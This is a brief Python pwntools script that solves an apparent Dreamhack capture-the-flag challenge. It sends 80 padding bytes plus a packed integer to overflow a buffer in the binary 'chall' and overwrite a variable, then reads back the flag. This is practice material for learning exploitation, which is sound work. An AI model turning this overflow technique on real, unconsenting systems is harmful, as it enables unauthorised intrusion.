#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./chall")
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("host3.dreamhack.games", 13753)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    pl1 = b""
    pl1 += b"A" * 80
    pl1 += ptr.p32(1)
    io.sendlineafter(": ", pl1)

    io.recvuntil("DH{")
    flag = "DH{" + io.recvuntil("}").decode()
    ptr.logger.info(f"flag: {flag}")
    return


if __name__ == "__main__":
    main()
